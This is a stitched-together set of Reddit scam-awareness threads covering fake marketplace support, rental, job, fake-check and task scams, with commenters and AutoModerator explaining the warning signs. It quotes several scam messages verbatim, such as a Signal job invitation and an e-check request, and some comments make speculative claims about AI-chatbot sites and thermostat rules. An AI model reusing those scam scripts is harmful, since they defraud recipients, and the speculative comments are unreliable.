- I think the lesson here is that sellers on Etsy (and Ebay) should only communicate through the website message interface, not in text messages or emails. 

As long as you stay on the Etsy website (and you log into the site - don't click on a link sent to you), you should be safe in future. 

This is also true for buyers. 

You might try contacting Etsy seller support, but there's probably not much they can do.
- Ok tnx so much sir

I have the option of block this card in my bank application can i do that?
- Sadly, new sellers or sellers with not many sales are getting spammed with these fake "support" messages. I get them daily. However, real messages from Etsy appear in a separate section of the message system. All other messages like this should be reported which also auto-blocks them. I feel for OP and hope they don't fall for any others as they're likely to get more.
- Yes, if you can directly block your card with your bank app, do it.
- So their account name is just ‚ÄúSupport chat‚Äù? lol
- Ok tnx so much
- Yep! Or "Customer Support" or "From Etsy" and other variations...
- Damn, they should really have name filters for that. Not hard at all..
- Well the issue is that sellers often name the user that handles Customer Support for their business to‚Ä¶ well‚Ä¶ ‚ÄúCustomer Support‚Äù.
- Seems like a weird, not though-out system to me.

Title: Fake ‚ÄòRoom for Rent‚Äô Scam? A stranger came to my door.
Body: A stranger rang my doorbell claiming that someone had called him about a room for rent in my house. However, I never posted anything about renting a room, and he couldn‚Äôt recall who had spoken to him. He was a tall white man who drove in his motorcycle. My mom opened the door but I called my mom what was going on while I was watching the security camera. The man waited outside but he eventually drove off. What might be the scammer‚Äôs intention? Is that a common question for potential scammers? Are they trying to get personal information or barge inside the house the moment the door is open? I could be overthinking but I don‚Äôt trust any stranger coming to my door.

- Has your house been for sale or rent recently? It's not unusual for scammers to farm photos of recently sold houses so they can make new posts for them and scam people out of deposit money. It's possible he was staking the place out, but that isn't nearly as common as people on this sub seem to think it is. No decent thief wants eye witnesses or to be recorded by a door bell camera.
- Tell your mom not to answer the door if she's not expecting a specific person (and can see who it is).  The number of people who feel obligated to answer the door remains surprisingly high.
- He's quite possibly paid a deposit to view the place, or even a month's rent up front to a scammer.
- It's more likely a scam on him than you. Scammers will often offer to rent out places they don't own for an advance fee.
- This is definitely a rental scam where he got scammed. It‚Äôs SUPER common. Like when I was trying to find a place 75% of them were scams.
- My best guess is he was casing houses and ringing doorbells to see if they were empty so he could rip them off later. He's not that smart, so his story wasn't very good when someone answered Or maybe he's just a weirdo. Anyway, as long as he doesn't come back don't worry too much
- That‚Äôs definitely suspicious! It could be a scam where they try to get personal info or see if your house is empty. 

Good thing you were watching from the camera and didn‚Äôt open the door! I‚Äôd recommend telling your mom to avoid answering the door for strangers unless you're expecting someone.
- The scam was probably not this guy but whoever sent him to your address. I wouldn't worry about it, but if you're bothered, get a camera doorbell, which allows you to talk to the person on your doorstep without opening your door.
- !Rent
- Got ya!
- >It's not unusual for scammers to farm photos of recently sold houses so they can make new posts for them and scam people out of deposit money

Most likely this, though they don't even need actual pics from inside. A pic from street view is plenty, or even of a random different place. Anyone desperate for housing probably would overlook that
- It was shady that he ‚Äúcouldn‚Äôt remember‚Äù who told him about the room, though.
- It could have been a rental scam as well, he might genuinely have thought there was a room
- Might be both. He's casing houses to rob, AND got scammed about a room for rent.
- Yeah he‚Äôs for sure casing out all of his potential future neighbors. Be fr.

Title: Remote Job Offer Email Scam after applying for jobs on Indeed
Body: I was excited to wake up to this email subject but then things didn't add up. Everything from mismatched email and signature to downloading a strange encryption app for an interview, unrealistic pay, a company not hiring for this position, and a hiring manager that doesn't work there. I found some examples of a similar scam here in posts from a few years ago and wanted to be sure to contribute updated information.

>Subject: Interview Invitation for Remote Position

>From: Name1 CompletelyUnrelatedBusiness.com <Name1@CompletelyUnrelatedBusiness.com>

>Dear Applicant, ***(no personalization)***

>My name is \[Name2\] ***(name different from the email)***, and I am reaching out regarding your interest in a remote position in Data Entry, Administration, HR, or Customer Service with us. We were impressed by your background and would like to invite you for a job briefing and interview. ***(All of these are things I have been applying for but none are listed on the company's website)***

>To proceed, please download the Signal Messenger App **(LOL)** from the Google Play Store or Apple App Store, create a profile, and connect with the hiring manager,  \[Fake Hiring Manager\] ***(someone who works in the same country as the business in the job offer but not for that business)***, via Signal.

>Once you have downloaded Signal, please add \[Fake Hiring Manager\] to your contact list and send her a message. You can reach her through Signal using her Phone ID: \[Phone Number\] ***(the phone number is for someone in Arkansas, USA the business and "hiring manager" are in Switzerland.)***

>During your conversation, Mrs. \[Fake Hiring Manager\] will provide details about various available roles, such as Customer Service, Data Entry, Administrative Assistant, Marketing Specialist , Sales Manager, Communications, Operational Roles, Chat Support, Typist, and Clerical Assistant. She will also answer any questions you may have and provide more information about the company and position.

>

>Important Information:

>‚Ä¢ Hiring Manager: \[Fake Hiring Manager\] 

>‚Ä¢ Signal Messenger ID: \[Phone Number\]

>‚Ä¢ Company Name: TERRA QUANTUM AG

>‚Ä¢ Pay: $34.85 per hour ***(LMFAO)***

>‚Ä¢ Start Date: ASAP

>Please note that Signal is our secure channel for online interviews. Once you have registered, click ‚ÄúStart a new conversation‚Äù and add her phone ID to connect with her.

>We look forward to speaking with you soon.

>Best regards,

The other examples of this that i saw said the scam lead to them asking for banking info and/or sending the applicant fraudulent checks. I did not respond to this attempt to confirm that. Stay safe y'all!

Title: Am I Overthinking This? Suspicious Encounter at the Mechanic
Body: So, I‚Äôm at a mechanic shop for an oil change, and I hand over my keys. The man at the front desk takes my keys and then says, ‚ÄúCan I use your phone to make a call? Our cellphone isn‚Äôt working.‚Äù I gave him my phone, and he made a quick call, saying something like, ‚ÄúOkay, did you get it?‚Äù before hanging up. The whole thing took about 15 seconds.

After that, he asks me, ‚ÄúHave you been here before?‚Äù I said, ‚ÄúYes.‚Äù Then he asks, ‚ÄúWhat‚Äôs your phone number?‚Äù I replied, ‚Äú123-456-7890.‚Äù But I noticed he only typed the numbers after the 4 into their system and skipped the first three digits, which made me feel really suspicious.

About 30 minutes later, the guy was gone, so I asked someone else at the shop if I could use their shop phone. I explained that I thought something was wrong with my cellphone. When I called a friend using their phone, it worked perfectly fine!

I don‚Äôt know, but I feel very suspicious about the whole situation. Has anyone else experienced something like this before?

**
- Since nobody carries a phone anymore, we suggest you not hand your banking computer over to strangers.
- I would bring it up to the manager just incase because by the sounds of it the mechanic might be doing something that he doesn't want their boss to know about.
- Does your phone number start with the local area code? I've had businesses type in the local area code before asking for my number, then have to delete it because my phone number was out of state.

Him using your phone - he's doing something he doesn't want visible on the office phone records, or not connected directly to him. You should never let strangers borrow your phone.
- Never let someone use your phone. NEVER.
- Might be interesting to google the number he called.
- Did you check your zelle/venmo/etc?
- ‚ÄúWaitaminute, you memorized somebody‚Äôs phone number?‚Äù

Anyway, was that other call in your recents?
- What number did he call? Did you look it up?
- Check the call forwarding settings on your phone.
- You just gave me a new thing to teach my teen son to never ever do.
- Don't hand your phone to strangers.  Your financial apps are on there. If they need to make a call, you dial and put on speaker, never relinquishing your cell.
- Many older system will pre-fill the area code. So when you say he only typed in the numbers starting at 4‚Ä¶.  They skipped the area code when for many areas is rather large.
- Did this by chance happen in the Denver area?
- There are numbers you can dial that alter your mobile account. For example (based on a quick google) *72 can be used to forward your calls to another number. Check what they dialed in your call history. Confirm you can receive incoming calls and sms (not imessage). Then I would call your mobile carrier to confirm no changes were made. If they redirect your text messages or calls they may be able to get your 2 factor authentication codes to login to accounts.
- Might he have sent a photo of your car key or house key? Duplicates can be made from photos. And the fact that the number he called is out of state is pretty much meaningless. So‚Äôs yours.
- Guy was probably doing something he didn't want recorded, shouldn't be an issue for you. As for your phone number plenty of places have records you can search through without the full number, it's quicker to search that way.
- It could be that he was closing a "business deal" that he didn't want tied to his phone. What happens if the deal goes south?
- this is why I have NO financial apps on my phone. All they could do is buy gas if they had my PIN.
- Thanks
- No it‚Äôs not the local area code. I‚Äôm from out of state. I agree with you 100%. I was stupid to let him use my phone. Lessons learned!
- Yeah op, what number did they call?
- Yeah nothing
- Yeah. A number with an area code of another city. Googled it. But didn‚Äôt find anything
- Thanks for the tip. I checked but nothing
- Yeah. I also told my story to all of my friends and family
- Legitimately curious. The common banking/money apps we have in Sweden always require you to enter a pin. Is it not the same in other countries?
- OP is from out of state and doesn't have a local area code.
- No
- Thank you so much! Confirmed that calls are not forwarded. I can also receive SMS. But I will also double check with my career
- And, his conversion would be more along the lines of  
"Hey, this is Moe at Bob's garage. Our phones aren't working and this customer let a rando borrow his phone...."

No managers or mechanics have cell phones - pretty strange in 2025.
- Unless he was typing into a search field to find your existing account if you'd been there before?

Anyway, seems odd. If I have to give someone my phone I'll always pin the app (Android) so you need to unlock the phone for other apps. This is only with people that I know, for other people wanting to use my phone I'd do the dialing on speaker as mentioned.
- It was a random number in another city. Searched it on the internet. Didn‚Äôt find anything.
- I think you can save those pins on your phone so it automatically logs you in.  Is there another layer in Sweden? Like do they send you a pin for each login or something?
- Yeah exactly that‚Äôs actually what surprised me
- or say ... A LANDLINE AT THE BUSINESS???

We don't have a landline at home. There's no point with just the two of us. But it's basically unheard of for them not to have a landline at the location...
- How do you pin the app?
- How do you pin the app?
- I pay for been verified monthly if you want me to put the number though the app.  The only numbers I usually don't get anything from are Google voice numbers.
- Basically! Like our "venmo" app. You can log in and input whatever amount you want but to actually send it you need to log into your bank identity service, and that one requires a pin. I also have an app from my actual bank , but to use that I also need to type in my bank Identity thing. And even once I'm logged into my bank's app I need to type in the identity pin again to confirm if I want to send someone money. 

I'm not sure how it is with apple pay or Samsung pass since I don't use it, but no one's getting any money from my "Venmo" without the pin.
- Turn on "pinning" from "security & privacy" then you can press the app icon from task switcher and select pin.
- Thank you for explaining it to me.  I don't have venmo or apple/google pay and I may never. But I still want to understand how they work. This helps with that. It sounds like the banks and the apps both make an effort to prevent theft on them.

Title: Cashier bitcoin scam?
Body: I got an offer through text message from a 708 number to post Facebook apartment rent listings for Peterson properties. I asked the person where they were located and it matched my search on Google. They would pay me through Zelle and I would direct the people on Facebook marketplace interested to the number. Thought it was fine. Then they said they had another position open as ‚Äúcashier‚Äú to recieve money from customers and buy bitcoin to send to a buisness address. I asked to just be paid for the Facebook listing but they are still insisting on the bitcoin. I asked them for more proof and they sent a video of themselves talking with their gov ID, seems like a normal person. But I‚Äôm still feeling iffy, what should I do.



  
its pretty similar to this OP problem

You post fake listings to !rental scam people on Facebook. When the victims report the scam to Facebook and law enforcement, the investigation leads back to you and your account.

>Then they said they had another position open as ‚Äúcashier‚Äú to recieve money from customers and buy bitcoin to send to a buisness address.

You launder money stolen from scam victims.

Normal people do not freely send their ID to random internet strangers. You were sent a video that was recorded by another scam victim who thought they needed to verify their identity.
- Sounds like hiring a layer of people for rental scams where they take their money for credit checks and security deposit & run with it.

- Hi /u/Splax77, AutoModerator has been summoned to explain the Rental scam.

Rental scammers usually list apartments at lower than market rate, and will ask for some money up front, or will offer you the keys for money up front. The scammer has no property to rent, and any money you send to the scammer will be lost.

Always tour the place in person with the landlord, property manager or realtor. Never alone, never with an access code, never virtually. Only send deposits and application fees after touring the place, and get a proper receipt for it. Anyone trying to collect money from you without meeting you is a scammer or a shit landlord.

Verify the identity of whoever is touring the place for you. It's always good to check with neighbors to see if the person you're dealing with is legit, or if there's a story behind it. You may learn that this is actually an Airbnb and that a scammer got an access code for it. You may find out the real owner/renter is away on vacation. And if it's a sublet, be informed about it and check with the original landlord to see if it's allowed.

Never sign contracts, or pay deposits, or even application fees/reservation fees without meeting in person first. Never ever send a photo ID or anything not considered public information. Nobody should ask you to pay to reserve your spot without meeting face to face.

Don't trust what you just read, don't try to reach out to "hackers" on Instagram or Telegram. Scammers will also try to reach out to you via DMs saying they know a professional hacker that can help you, for a small fee. They're actually trying to steal your money.

- That's if you're "lucky" and it is money laundering. It could also be a fake check scam where they send you a fake check, you see the money in your account and think it's all good and buy bitcoin and send it off. Days later the bank finds out it's a fake/fraudulent check and deducts it from your account and you've already sent the bitcoin to them.

Comments:
- Straight to the bank. Your card is compromised. Call the number on the back of the card.
- Go straight to the bank and dispute the charges. If they are scammers changing you for something you never ordered, do you think they would help. Could you trust anything they tell you? Save time and just go directly to the bank.
- What‚Äôs ‚ÄúMta‚Äù?  Why don‚Äôt you have notifications enabled for your bank accounts and credit cards? You want to be notified instantly whenever some transaction hits them. 

If this was from a stolen debit card you‚Äôll find it very difficult to get a refund as banks have only 3 days for quick refunds otherwise it can take up to 90 days and often declined.

This is why you never use a debit card for online or in person transactions.
- Actually happened to me as well few hours ago. Any update?
- Bro, I just now got the same fraud alert! How!?? I don't know them at all!
- Aye I‚Äôm not saying you have but have you ever been to one of those ai girlfriend sites? No shame just asking because a lot of them run on EverAI software and if you read there terms and service agreement it says so like Candy.AI and stuff like that. After hearing that story about that boy who killed himself because that AI I checked out a bunch of myself to see if I could get the same reaction and a lot of them are owned and ran by ‚ÄúeverAI
- Sorry I meant Malta. Yeah the transaction just happened today so it's still processing. I'm going to call the bank once I get home from work.
- It's still processing so they said they'd have to wait for it to go through before closing the card and disputing the charge.
- I mean I've been to some AI chat bot sites lol so maybe that could be it.
- Probably brother. EVERAI owns a lot of bots and websites

Title: Employment scam: inspirafinancialcareers.com
Body: I hope this helps someone else spot this employment scam quickly. 

It looks like they are scraping LinkedIn for candidates looking for work, and playing the "you've been accepted for an interview" game that eventually leads to "we will send you a check to set up your home office" 

The domain for this email was CREATED on namesilo.com as of Jan 16, 2025. 

The company's official domain: inspirafinancial.com was created in 2023, and is managed by Cloudflare, and looking at the company site, they route all actual recruiting activity through ADP. 

Clearly a scam. 

Careful out there, they're getting aggressive.

- Another day another fake check scam. If they get shut down they'll just open right back up with a new name an hour later. The names don't matter. Knowing the hallmarks of scams is how you prevent scams.
- Most job offers for remote or work from home jobs are scams. If you're currently looking for a job, spend a little time here to get familiar with !job scams so you recognize the signs.

Some red flags:

- contacted  on WhatsApp, Instagram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (fraud / money laundering)

- job involves re-shipping packages (parcel mule)
- I'm new to this subreddit. 

Are my methods of domain validation useful, or am I wasting my time?
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.


**
- They are irrelevant because this is clearly a scam and nothing will make it not a scam. You can't validate a scam. You need to stop combining social media and investing you will just get scammed again. Talk about business ideas sure but if anybody proposes anything to you involving money, it's a scam.

Title: Got a gift card with my username on it, not my real name
Body: Apologies for the repost, the address/info was not completely censored. 

Received a gift card with my username tag on it
Just opened my mail box and came upon this letter. I was perplexed as it has my username on the letter instead of my real name.
I originally assumed this was a giftcard for the energy savings program our gas company gives when you switch to a smart thermostat. 
Here in Ontario (Toronto at least), the gas company will issue a $75(from what i recall) discount code on a specific smart thermostat when bought brand new in-store from either Home Depot, Best buy or the recommended manufacturer. 
At first I thought this was it, but then quickly realized that I bought my smart thermostat from Facebook marketplace for cheaper. 
Now I am a bit skeptical of this card and lette if
It‚Äôs legit. $75 will help tbh. But i‚Äôm not going to risk my info getting stolen cuz of it.

Has anyone have a similar case? I did check the company that issued this card, it seems legit? But then again, I might be too gullible and naive.

- Looks like a legit gift card. What could they steal by swiping a gift card?
- Did you enroll into save energy Peak Perks program? 
Because is will send you $75 virtual prepaid Mastercard the 1st time and $20 virtual prepaid Mastercard per year.
- This is your reward for enrolling in their ‚ÄúEnergy Saving‚Äù program. The name on the card is irrelevant.

**Just note that it likely isn‚Äôt free money.** In return for this payment (discount on the Nest), you probably gave the power company the right to control your heating andAC during times of extremely high electricity demand via that ‚Äúsmart thermostat‚Äù.

So don‚Äôt be surprised if, when it‚Äôs very hot or very cold outside, your thermostat temperature is capped. Read the fine print on your bill about the ‚ÄúPeak Perks‚Äù program you are enrolled in.

Note that the power company can‚Äôt just kill your heat/A/C altogether on a hot/cold day. They are required to (in the U.S.) maintain a minimum habitable temperature by ASHRAE 62.1 and federal codes and standards so it will never get dangerously hot. 

But under this program, you won‚Äôt be able to simply crank the AC/heat to full blast whenever you like during times in which the power company determines there is high power grid demand.
- Is there a website on the back where you can look up the value?
- I can‚Äôt see a scam here. Unless the gift card is actually a credit card‚Ä¶ idk I‚Äôm trying.
- [removed]
- These are pretty normal. Companies will send these out as sort of loyalty rewards
- I‚Äôm confused by how many people aren‚Äôt addressing what seems to be your point of posting: The card used your username, not your real name, like I‚Äôd expect a legit company to use if I was doing business with them.

It looks like ‚Äúshine‚Äù something, which isn‚Äôt your Reddit account for this post. Which platform‚Äôs username was it from? (Edit: From Facebook marketplace? Maybe your [user]name got passed along to the company when you bought the thermostat? That seems kinda weird, though.)
- Bro it‚Äôs a master card dog credit card all you need to do is set it up
- It really doesn't matter where you purchase the device from - mine came from Amazon and I entered the info with my local power company. They send me gc every 6mo provided I don't adjust my settings and let them control it.

Any extra heat or cooling I need, I supplement with overhead fan or space heater for the room I'm in.
- Do you allow your utility company to "pre-cool" your smart thermostat in the summer to help reduce usage during peak periods?  If so, it's legit.
- Call the gas company on their main line and ask.
- This is a prepaid credit card which is operated by your energy supplier reading the bumf. So your energy supplier is trying to get more of your hard earned cash from you
- Your USERNAME?? That's wild!
- [removed]
- UPDATE:

Now I wouldn‚Äôt reccommend this but I scanned the QR Code and it activated the card. No personal info was inputted but then again scanning a QR code is still risky. I didn‚Äôt call the gas company cuz of my schedule(and laziness). 

I‚Äôll try to use the card in a few hours.
Just a small reminder not to scan QR codes willy nilly
- If that‚Äôs your actual power company it‚Äôs real reasons being you might have overpaid on your bill so they send you the money back through one of these prepaid debit cards

I had to add the last part some people take out a card and never pay back thus causing people to not to get a house car and so forth for things for credit if they don‚Äôt take care of their credit
- WHY DID YOU REDEEM IT??!
- Yeah credit is VERY important!
- Why are you asking CIAMom420 that? #1- she's not OP, so that's not her giftcard, and #2 - OP didn't redeem it either afaik.

Title: Student loan forgiveness scam

Title: USAA account for employer?
Body: Hello! Earlier today I received a text message from a company I put in an application for on Indeed. The position is to be a personal assistant and after we did a short interview over text he offered me the position, but said I would need a USAA account in order to receive my payment and he could have someone help me make one. He also asked for my PayPal so he could send me $50 to set up the account. Does this scream scam and if so, what kind?? I feel so confused. The job is great but I know the old saying, if it sounds too good to be true, it probably is

- This is a scam.  There is no reason you need a USAA account to receive payment.  Based on that alone I would run.

Also, remote personal assistant jobs are 99% scams and invitations to go to prison for money laundering.

It's difficult to tell what their angle is.  If you're not military or prior military or have military family members (parents etc.) you aren't eligible for USAA anyway.
- > said I would need a USAA account in order to receive my payment 
and he could have someone help me make one.

There's no logical reason for that. By the way, usaa membership is limited to military, former military, and their families. 

> Does this scream scam

yes

>  and if so, what kind??

There's no telling. 

* If they help you set up the usaa account, they may very well have access. They may use that to take out a loan from usaa in your name.  
* Or they may arrange some dubious payment/checks into your account and then tell you to use those funds to pay something from the account (so when their dubious payment/check bounces, you are left holding the bag).
  * It could be they have found that the timing of deposit processing / availability / clearing by usaa works best for that type scam
- Yes, it does, it screams scam. Because the interview was over text. No real employer does text-only interviews. And the pay thing sounds scammy too.

What is USAA? The insurance company?

What are the job title and responsibilities?

There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages" but what the scams really do is steal your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

Most job offers for remote or work from home jobs are scams. Since you're currently looking for a job, spend a little time here to get familiar with job scams so you recognize the signs. Read the automod replies that have already been posted. There are several WFH subs on Reddit, where people who actually have remote jobs share stories and info. But:  beware, on any social media including Reddit, there are scammers lurking and posting. 

Some red flags for job scams:

- contacted  on WhatsApp, Instagram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (fraud / money laundering)

- job involves re-shipping packages (parcel mule)

Read through posts here, you will see many sad stories of people who thought they had a WFH job and found out it was a scam.
- >we did a short interview over text 

Real companies don't do that.  The usual process is an initial phone screening, followed by either an in-person interview or video-chat interview.  The only time text-only communication is used is to set up the actual interviews.

Any time you get a "text interview" followed by a job offer, it's a scam.
- More info in automod: !job scam
- Who offers someone a job without meeting them? Obvious scam. I don‚Äôt understand the usaa thing tho. I have usaa and don‚Äôt know of any advantages to using it for a scam. Plus not just anyone can get usaa so that seems weird
- This is what I was going to say. Not just anyone can get USAA. In fact, relatively few people can have USAA. I had to be vouched in by my parents.
- This is the correct answer
- Yeah he told me he was a veteran early on so I‚Äôm assuming that‚Äôs why he uses it, but I couldn‚Äôt think of a reason why he wouldn‚Äôt be able to pay me if I was using a different bank. I know my friends who have schools first have had issues with paying people who don‚Äôt have it so I was assuming that was the reason, but I don‚Äôt know.
- > What is USAA? The insurance company?

usaa is an insurance company but also a bank. They offer savings accounts, checking accounts, credit cards, loans, etc.
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.


**
- Besides chase jp Morgan and other banks,¬† USAA has also been heavily targeted with Zelle & other banking scams.


No. Not only is it only open to military, (so his "help" would fraudulently be opening an account) but there is no reason why an employer would need a particular bank in order to pay you wages.


Probably would lead to fake check scam then Zelle/apple pay/wire etc him the extra money type of crap.


Or has your credentials and just empties it after a fake deposit and you are on the hook for banking fraud

Title: I was duped by a fake job post
Body: I made the mistake of reaching out to a fake job post on Facebook Marketplace and I gave them my phone number, age, name and if I am an American citizen. They then had someone explain more about the job to me on WhatsApp and then speak to someone on Telegram. They then explained I am required to create an account and every day sign in and submit 48 reviews for a travel location in which they promise to make me money. I then end up with a negative balance and so I ask them to recharge it. They then instruct me to log into their account and do the same thing. I begin to get very suspicious that this is a scam or it is illegal and they say why prove it is all true. Finally they ask for me to send money on PayPal and I left and reported it all to the FBI. Yet I never sent any actual money at all

I hope I do not get into any trouble in this

- It's a !task scam

Please STOP all contact with them. Any money you've sent to them is unfortunately gone. (edit: ah, well it's good you didn't send any money)

While these scam sites pop up all the time, you can write (don't link it) the website url so maybe it will help when people google it and find this post.
- OP, you were smart to see the red flags, and not give them any of your money. Often, in this type of scam, the posted fake reviews go to a fake website, I don't know if that's the case here. Usually with a job scam like this, they ask you to give them money to "unlock premium tasks" or some other made-up reason.

edit to say you were smart to get out before giving them money
- Good job not sending any money. Report them on WhatsApp if you can. Most important thing is to report these accounts on chat platforms; that's the only way you can damage the scammer as it takes time to work around the reports with new accounts etc.
- Sounds like the scam is basically to trick people to write fake travel reviews for free, and if the workers later pay the scammers to continue working, all the better.
- There is no honor among thieves. You accepted what you thought was a job where you scam others by writing fake reviews for money. So, you should have expected to be scammed as well.

- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: Wedding Anniversary Invitation Scam
Body: I didn't suspect anything until this Sarah person started suggesting that they pay me up front, outside of my usual previously explained payment structure in the form of an E-check cheque. I had sent them an agreement for them to sign which they haven't signed or even addressed.

This is the last message they sent: ''I would love to inform you that we are ready to proceed with working together on this project.  
Also, I must mention that I'm very occupied lately with work and making arrangements for our occasion, so I'd prefer to have the finished work sent directly to the printer lady after my review and approval.  
As for the payment, I'm okay with paying you the entire amount of (¬£100) to start working on the project. However, the easiest way for me to carry out the payment is via E-check due to my bank restrictions. (i.e) I'll prepare the check and have the PDF file sent to your email address, you can easily download the check file and open the images on your computer . After which you will carefully capture the 4 Edges of the check using the ‚ÄúMobile check deposit‚Äù option on your Mobile Banking App, and the payment will be processed automatically.  
That being said, please get back to me with your Full Name & Bank Name (for endorsement).  
I'm looking forward to working with you on this project.  
Thanks. Regards  
Sarah.''

This is the 'Sample' they had sent me:

Comments:
- Hi /u/Mich962432123, AutoModerator has detected keywords in your post indicating that this is a porn blackmail email scam. The exact wording of the emails varies, but there are generally four main parts. They claim to have placed software/malware on a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video. There are variations of this scam that claim you were caught in a child porn/grooming sting. Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. While this type of blackmail attempt is a bluff, even when the blackmailer actually has compromising videos, paying them does not buy silence - it merely ensures more demands for money. One should never pay a blackmailer... [Here is the /r/scams mega thread on this scam](https://www.reddit.com/r/Scams/comments/8gsjba/the_blackmail_email_scam/). If you want to help other people who receive the same email as you, you should copy/paste the email you received into the [megathread](https://www.reddit.com/r/Scams/comments/jij7zf/the_blackmail_email_scam_part_6/).

- Every single aspect of that is a scam. If any of that language is used, run.
- basically every small business (you, photographers, caterers, etc.) get this fake check pay up front scam, and the stolen credit card => cancel => refund to different card scam.
- I love how they point out they have "banking restrictions" but don't seem to think that would be a red flag to anyone they are trying to pay.  Banks don't "restrict" you unless you have done something you aren't supposed to be doing, so why would I trust that you are on the up and up with me?
- !fakecheck scam for reference.
- Ugh, this reminds me that wedding websites seem to attract a lot of scammers, probably because they include lots of older guests who aren't savvy. Be warned!

My nephew used a site for his wedding this summer: we had to RSVP through the site for the various events and log in to upload and download photos, look at the gift registry, share rides, etc. 

It was all quite convenient, until someone's email got hacked and we all got an invitation to a nonexistent afterparty with a link to click to RSVP that then tried to get our personal data and some kind of reservation payment. At which point I blocked, deleted, and wrote an irate email to the person I thought had sent the invite.

- I think their endgame was to give her extra money and have her pay the ‚Äúprinter lady‚Äù directly.
- Hi /u/onmyti89_again, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.


**
- For those who don't know, they do this so they can make sure the fake check they send you is from a bank that is *not* your bank, because your bank would be able to tell right away that it's fake.

What perplexes me is within 30 seconds of the first notification of the text, I get another one advising I've been removed from the group text.  I understand the scam of paying a fake toll.  Why would they remove me?  What's the game?

- They're probably preventing somebody in the group chat from saying 'hey this is a scam FYI' to everybody else in the group chat maybe?

Alternatively they may be trying to get around some anti-spam set up by the providers.
